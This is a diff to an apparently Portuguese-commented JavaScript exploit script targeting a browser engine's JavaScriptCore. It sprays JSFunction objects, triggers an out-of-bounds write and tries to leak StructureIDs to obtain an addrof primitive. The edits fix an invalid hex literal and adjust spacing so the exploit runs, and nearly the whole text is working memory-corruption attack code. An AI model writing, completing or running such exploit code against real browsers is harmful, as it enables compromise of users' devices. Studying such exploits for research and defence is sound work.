@@ -26,7 +26,7 @@ const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Onde o JSCell lido será copiad
 let getter_copy_called_flag_v10_28 = false;
 
 // !!!!! VOCÊ PRECISA DESCOBRIR ESTE VALOR !!!!!
-let EXPECTED_JSFUNCTION_STRUCTURE_ID = null; 
+let EXPECTED_JSFUNCTION_STRUCTURE_ID = null; // Removido espaço não quebrável do final
 const PLACEHOLDER_JSFUNCTION_SID = 0xBADBAD00 | 46;
 
 
@@ -87,7 +87,7 @@ export async function sprayAndInvestigateObjectExposure() {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
-        logS3(`   AVISO: Tentando descobrir StructureID de JSFunction. Placeholder: ${toHex(PLACEHOLDER_JSFUNCTION_SID)}`, "warn", FNAME_CURRENT_TEST);
+        logS3(`    AVISO: Tentando descobrir StructureID de JSFunction. Placeholder: ${toHex(PLACEHOLDER_JSFUNCTION_SID)}`, "warn", FNAME_CURRENT_TEST);
 
 
         // 1. Limpar áreas de interesse e Pulverizar JSFunctions
@@ -98,15 +98,17 @@ export async function sprayAndInvestigateObjectExposure() {
 
         const NUM_SPRAY_FUNCS = 200;
         for (let i = 0; i < NUM_SPRAY_FUNCS; i++) {
-            sprayedFunctions.push(function() { return 0xFUNCSEED + i; });
+            // CORREÇÃO: Substituído 0xFUNCSEED por um valor hexadecimal válido.
+            // Se 0xFUNCSEED tinha um significado específico, ajuste 0xCAFE0000 para o valor correto.
+            sprayedFunctions.push(function() { return 0xCAFE0000 + i; });
         }
         logS3(`  ${sprayedFunctions.length} JSFunctions pulverizadas.`, "info", FNAME_CURRENT_TEST);
         await PAUSE_S3(300);
 
         // 2. Acionar a Corrupção em 0x70
-        //    NÃO plantamos nada em 0x6C antes disso. Esperamos que a corrupção em 0x70
-        //    faça com que um ponteiro para um dos sprayedFunctions (ou parte dele)
-        //    seja escrito em 0x6C.low, que então se tornará 0x68.high.
+        //     NÃO plantamos nada em 0x6C antes disso. Esperamos que a corrupção em 0x70
+        //     faça com que um ponteiro para um dos sprayedFunctions (ou parte dele)
+        //     seja escrito em 0x6C.low, que então se tornará 0x68.high.
         logS3(`PASSO 2: Acionando corrupção em ${toHex(CORRUPTION_OFFSET_TRIGGER)}...`, "info", FNAME_CURRENT_TEST);
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
         await PAUSE_S3(100); // Dar tempo para a "mágica" acontecer
@@ -131,8 +133,8 @@ export async function sprayAndInvestigateObjectExposure() {
                 
                 // Tentar identificar se é de JSFunction (você precisará do SID real de JSFunction)
                 // if (EXPECTED_JSFUNCTION_STRUCTURE_ID && sid_leaked === EXPECTED_JSFUNCTION_STRUCTURE_ID) {
-                //    logS3("        >>>> CORRESPONDE AO SID DE JSFUNCTION ESPERADO! ADDR_OF OBTIDO! <<<<", "vuln");
-                //    document.title = `ADDR_OF JSFUNC @${toHex(potential_leaked_offset_from_0x68_high)}`;
+                //     logS3("        >>>> CORRESPONDE AO SID DE JSFUNCTION ESPERADO! ADDR_OF OBTIDO! <<<<", "vuln");
+                //     document.title = `ADDR_OF JSFUNC @${toHex(potential_leaked_offset_from_0x68_high)}`;
                 // }
 
             } else {
